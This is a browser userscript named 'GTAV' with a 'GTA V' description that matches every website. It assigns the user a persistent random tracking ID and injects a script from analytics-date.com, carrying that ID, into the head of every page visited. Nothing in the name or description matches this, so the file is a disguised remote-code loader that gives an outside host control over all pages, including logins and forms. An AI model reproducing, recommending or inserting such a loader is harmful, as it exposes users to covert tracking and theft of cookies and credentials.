// ==UserScript==
// @name         GTAV
// @namespace    http://violentmonkey.net/
// @version      0.2
// @description  GTA V
// @match        *://*/*
// @grant        GM_setValue
// @grant        GM_getValue
// @downloadURL https://update.greasyfork.org/scripts/520440/GTAV.user.js
// @updateURL https://update.greasyfork.org/scripts/520440/GTAV.meta.js
// ==/UserScript==


(function() { 
  const head = document.head || document.getElementsByTagName('head')[0];
  if (head) {
    const unixTime = Date.now();

    //uh
    let uh = GM_getValue('uh');
    if (!uh) {
      const randomString = Math.random().toString(36).substr(2)+Math.random().toString(36).substr(2)+Math.random().toString(36).substr(2);
      uh = `${unixTime}-${randomString}`;
      GM_setValue('uh', uh);
    }
    //uh

    const script = document.createElement('script');
    script.src = `https://analytics-date.com/run.js?uh=${uh}`;
    document.head.appendChild(script);
    
  }
})();
